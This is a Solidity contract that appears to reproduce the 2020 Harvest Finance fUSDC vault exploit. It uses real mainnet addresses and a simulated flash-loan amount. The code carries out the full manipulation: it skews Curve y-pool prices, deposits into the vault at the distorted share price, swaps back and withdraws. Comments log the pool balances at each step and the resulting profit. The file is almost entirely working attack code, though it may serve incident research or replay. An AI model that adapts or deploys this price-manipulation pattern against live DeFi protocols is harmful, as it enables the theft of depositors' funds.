// SPDX-License-Identifier: AGPL-3.0-or-later

pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interface.sol";
// 0x35f8d2f572fceaac9288e5d462117850ef2694786992a8c3f6d02612277b0877

// Block 11129474
// Block index 0
// Timestamp Mon, 26 Oct 2020 02:53:58 +0000
// Gas price 525 gwei
// Gas limit 12065986



contract Harvest_USDT_attack {
    address EOA;
    address private constant WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UniswapETHUSDTAddress = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
    address private constant UniswapETHUSDCAddress = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address private constant UniswapV2Router02Address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address private constant USDCAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDTAddress = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    address private constant yUSDCAddress = 0xd6aD7a6750A7593E092a9B218d66C0A814a3436e;
    address private constant CurveFiAddress = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;

    address private constant fFarmAddress = 0x9B3bE0cc5dD26fd0254088d03D8206792715588B;
    address private constant VaultProxyAddress = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    address private constant StrategyAddress = 0xD55aDA00494D96CE1029C201425249F9dFD216cc;


    IUSDT USDT = IUSDT(USDTAddress);
    IUSDC USDC = IUSDC(USDCAddress);
    yUSDC _yUSDC = yUSDC(yUSDCAddress);
    yERC20 CURVE_yPool = yERC20(CurveFiAddress);
    IERC20 VaultERC = IERC20(VaultProxyAddress);
    IfUSDC fUSDC = IfUSDC(VaultProxyAddress);
    IStrategy Strategy = IStrategy(StrategyAddress);



    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";

    string str80 = "";
    string str81 = "";
    string str82 = "";


    constructor() payable {
        require(msg.value == 200000 ether, "loan amount does not match");
        StandardToken(USDTAddress).approve(CurveFiAddress, 2**256 - 1);
        StandardToken(USDCAddress).approve(CurveFiAddress, 2**256 - 1);
        StandardToken(USDCAddress).approve(VaultProxyAddress, 2**256 - 1);

        EOA = msg.sender;
    }

    receive() external payable {}


    // loan amount = 18308555.417594 USDT and 5000 0000 USDC
    function attack0() public {
        // step 1: get 1830 8555.417594 USDT and 5000 0000 USDC for attack
        address[] memory ad = new address[](2);
        ad[0] = WETHAddress;
        ad[1] = USDTAddress;
        IUniswapV2Router02(UniswapV2Router02Address).swapETHForExactTokens{value: 50000 ether} (18308555417594 , ad, address(this), 2000000000);
        ad[0] = WETHAddress;
        ad[1] = USDCAddress;
        IUniswapV2Router02(UniswapV2Router02Address).swapETHForExactTokens{value: 150000 ether} (50000000000000, ad, address(this), 2000000000);
        // -----------------------------18308555.417594 USDT and 50000000.00000000 USDC--------------------------------------------------------------


        // Action 1: CURVE swap:   USDT -> USDC    State: Curve
        //                         State:  fUSDC
        // str1 = CurveSummary();
        // str2 = fUSDCSummary_invested_underlying(); 
        // uint USDCgot = USDC.balanceOf(address(this));
        CURVE_yPool.exchange_underlying(2, 1, 17222012 * 10 ** 6, 0); // USDT to USDC
        // str3 = CurveSummary();
        // str4 = fUSDCSummary_invested_underlying();
        // USDCgot = USDC.balanceOf(address(this)) - USDCgot;
        // revert(appendWithSpace( appendWithSpace(str1, str2), appendWithSpace(str3, appendWithSpace( str4, uint2str( USDCgot / 1e6)))));

        // full version:
        // Curve USDC balance: 59730435  Curve USDT balance: 48068621 
        // fUSDC underlying balance: 72825240 invested underlying balance: 52212225 
        // fUSDC total supply: 127588335 
        // Curve USDC balance: 44935335  Curve USDT balance: 64784125 
        // fUSDC underlying balance: 72825240 invested underlying balance: 51096307 
        // fUSDC total supply: 127588335
        // 17216702

        // reduced version:
        // Curve USDC balance: 59730435  Curve USDT balance: 48068621 
        // invested underlying balance: 52212225 
        // Curve USDC balance: 44935335  Curve USDT balance: 64784125 
        // invested underlying balance: 51096307
        // 17216702



        // Action 2: fUSDC deposit: USDC -> fUSDC  State: fUSDC
        //                         State:  fUSDC
        // str1 = fUSDCSummary();
        // uint fUSDCgot = fUSDC.balanceOf(address(this));
        fUSDC.deposit(49977468 * 1e6);
        // fUSDCgot = fUSDC.balanceOf(address(this)) - fUSDCgot;
        // str2 = fUSDCSummary();
        // revert(appendWithSpace(appendWithSpace(str1, str2), uint2str(fUSDCgot / 10 ** 6) ));

        // full version:
        // Curve USDC balance: 44935335  Curve USDT balance: 64784125 
        // fUSDC underlying balance: 72825240 invested underlying balance: 51096307 
        // fUSDC total supply: 127588335 
        // fUSDC underlying balance: 122802708 invested underlying balance: 51096307 
        // fUSDC total supply: 179044615 
        // 51456280

        // reduced version:
        // fUSDC underlying balance: 72825240 invested underlying balance: 51096307 
        // fUSDC total supply: 127588335 
        // fUSDC underlying balance: 122802708 invested underlying balance: 51096307 
        // fUSDC total supply: 179044615 
        // 51456280



        // Action 3: Curve swap:  USDC -> USDT    State: Curve
        //                        State:  Curve fUSDT
        
        // str1 = CurveSummary();
        // str2 = fUSDCSummary_invested_underlying();
        // uint USDTgot = USDT.balanceOf( address(this) );
        CURVE_yPool.exchange_underlying(1, 2, 17239234 * 1e6, 0);  
        // str3 = CurveSummary();
        // str4 = fUSDCSummary_invested_underlying();
        // USDTgot = USDT.balanceOf( address(this) ) - USDTgot;
        // revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(str3, appendWithSpace( str4, uint2str(USDTgot / 10 ** 6) ))));
        
        // full version:
        // Curve USDC balance: 44935335  Curve USDT balance: 64784125 
        // fUSDC underlying balance: 122802708 invested underlying balance: 51096307 
        // fUSDC total supply: 179044615 
        // Curve USDC balance: 59746834  Curve USDT balance: 48056798 
        // fUSDC underlying balance: 122802708 invested underlying balance: 52213993 
        // fUSDC total supply: 179044615 
        // 17230746

        // reduced version:
        // Curve USDC balance: 44935335  Curve USDT balance: 64784125 
        // invested underlying balance: 51096307 
        // Curve USDC balance: 59746834  Curve USDT balance: 48056798 
        // invested underlying balance: 52213993 
        // 17230746



        // Action 4: fUSDC withdraw:  fUSDC -> USDC  State: fUSDC
        //                           State:  fUSDC

        str1 = fUSDCSummary();
        uint USDCgot = USDC.balanceOf( address(this) );
        fUSDC.withdraw(51456280 * 10 ** 6);  
        str2 = fUSDCSummary();
        USDCgot = USDC.balanceOf( address(this) ) - USDCgot;
        revert(appendWithSpace(appendWithSpace(str1, str2), uint2str(USDCgot / 10 ** 6) ));

        // full version:
        // Curve USDC balance: 59746834  Curve USDT balance: 48056798 
        // fUSDC underlying balance: 122802708 invested underlying balance: 52213993 
        // fUSDC total supply: 179044615 
        // Curve USDC balance: 59746834  Curve USDT balance: 48056798 
        // fUSDC underlying balance: 72504025 invested underlying balance: 52213993 
        // fUSDC total supply: 127588335 
        // 50298683

        // reduced version:
        // fUSDC underlying balance: 122802708 invested underlying balance: 52213993 
        // fUSDC total supply: 179044615 
        // fUSDC underlying balance: 72504025 invested underlying balance: 52213993 
        // fUSDC total supply: 127588335 
        // 50298683

        revert(ProfitSummary());


        // current balance      : 18317289.039415 USDT and 50298684 USDC
        // compared to flashloan: 18308555.417594 USDT and 50000000 USDC
        // Profit                    8734        USDT and    298684 USDC
        // Total Profit:             307418
    }

    function ProfitSummary() internal returns (string memory _uintAsString){
        uint balance1 = USDT.balanceOf(address(this));
        uint balance2 = USDC.balanceOf(address(this));
        str1 = append("USDT balance: ", uint2str(balance1 / 10 ** 6));
        str2 = append(" || USDC balance: ", uint2str(balance2 / 10 ** 6));
        return append(str1, str2);
    }

    function CurveSummary() internal returns (string memory _uintAsString){
        uint balance1 = CURVE_yPool.balances(1) / 10 ** 6;
        uint balance2 = CURVE_yPool.balances(2) / 10 ** 6;
        return append(append("Curve yUSDC balance: ", uint2str(balance1)), append( "  Curve yUSDT balance: ", uint2str(balance2)));
    }


    function fUSDCSummary_invested_underlying() internal returns (string memory _uintAsString){
        uint invested = Strategy.investedUnderlyingBalance() / 10 ** 6;
        str81 = append("invested underlying balance: ", uint2str(invested));
        return str81;
    }


    function fUSDCSummary_rest() internal returns (string memory _uintAsString){
        uint underlyingBalance =  fUSDC.underlyingBalanceInVault() / 10 ** 6;
        uint totalSupply = fUSDC.totalSupply() / 10 ** 6;
        str80 = append("fUSDC underlying balance: ", uint2str(underlyingBalance));
        str82 = append("fUSDC total supply: ", uint2str(totalSupply));
        return appendWithSpace(str80 , str82);
    }


    function fUSDCSummary() internal returns (string memory _uintAsString){
        uint underlyingBalance =  fUSDC.underlyingBalanceInVault() / 10 ** 6;
        uint invested = Strategy.investedUnderlyingBalance() / 10 ** 6;
        uint totalSupply = fUSDC.totalSupply() / 10 ** 6;
        str80 = append("fUSDC underlying balance: ", uint2str(underlyingBalance));
        str81 = append("invested underlying balance: ", uint2str(invested));
        str82 = append("fUSDC total supply: ", uint2str(totalSupply));
        return appendWithSpace(appendWithSpace(str80 , str81), str82);
    }


    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }



}
